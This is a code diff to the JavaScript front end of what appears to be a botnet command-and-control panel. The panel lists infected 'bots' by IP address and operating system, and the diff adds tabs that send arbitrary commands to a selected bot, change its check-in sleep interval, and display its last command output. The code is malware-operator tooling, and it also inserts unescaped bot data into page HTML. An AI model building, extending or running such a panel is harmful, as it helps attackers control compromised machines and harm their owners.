@@ -1,3 +1,14 @@
+function csrf(){
+    var csrftoken = $('meta[name=csrf-token]').attr('content');
+    $.ajaxSetup({
+        beforeSend: function(xhr, settings) {
+            if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
+                xhr.setRequestHeader("X-CSRFToken", csrftoken)
+            }
+        }
+    });
+}
+
 function clients_list(){
     $.ajax({
         url: '/api/clients/list',
@@ -7,7 +18,7 @@ function clients_list(){
         success: function (data, textStatus, xhr) {
             $("#tb").html("");
             $.each(data, function(i, bot) {
-                $("#tb").append('<tr id="row' + i + '"><td>' + i + "</td><td>" + bot.IP + "</td><td>" + bot.OS + "</td><td>" + Math.round(bot.last_seen) + "</td>");
+                $("#tb").append('<tr id="row' + i + '"><td>' + i + "</td><td>" + bot.IP + "</td><td>" + bot.OS + "</td><td id=\"intervaltd\">" + bot.set_interval + "</td><td>" + Math.round(bot.last_seen) + "</td>");
                 $("#row"+i).dblclick(function(e){
                     e.preventDefault();
                     $('.modal-title').html(bot.IP);
@@ -24,6 +35,9 @@ function clients_list(){
                     if (bot.OS.toLowerCase().indexOf("mac") >= 0){
                         symbol = "fa-apple";
                     }
+                    $('#cmdip').val(bot.IP);
+                    $('#intip').val(bot.IP);
+                    $('#lastResponse').html(bot.last_response);
                     $('#cliOS').html("<i class=\"fa " + symbol + "\"></i> " + bot.OS);
                     $('#modal-pop').modal('toggle');
                 });
@@ -32,3 +46,44 @@ function clients_list(){
     });
 }
 
+function modal_tabs(e) {
+    var target = $(e.target).attr("href")
+    if (target == "#last-response"){
+        $('#submit-btn').hide();
+    }
+    if (target == "#run-command"){
+        $('#submit-btn').html("Run!");
+        $('#submit-btn').show();
+    }
+    if (target == "#sleep-interval"){
+        $('#submit-btn').html("Set Interval");
+        $('#submit-btn').show();
+    }
+}
+
+function submit_to_api(e){
+    var target = $(".tab-pane.active")[0].id;
+    var endp = "";
+    var jdata = "";
+    if (target == "run-command"){
+        target = "/api/clients/cmd";
+        jdata = JSON.stringify({'IP': $("#cmdip").val(), 'cmd': $('#command').val()});
+    }
+    if (target == "sleep-interval"){
+        target = "/api/clients/sleep";
+        jdata = JSON.stringify({'IP': $("#intip").val(), 'interval': $('#interval').val()});
+    }
+    $.ajax({
+        url: target,
+        type: 'POST',
+        dataType: 'text',
+        contentType: "application/json",
+        data: jdata,
+        success: function (data, textStatus, xhr) {
+            $('#modal-pop').modal('toggle');
+            if (target == "sleep-interval"){
+                $("td.intervaltd").val($('#interval').val());
+            }
+        }
+    });
+}
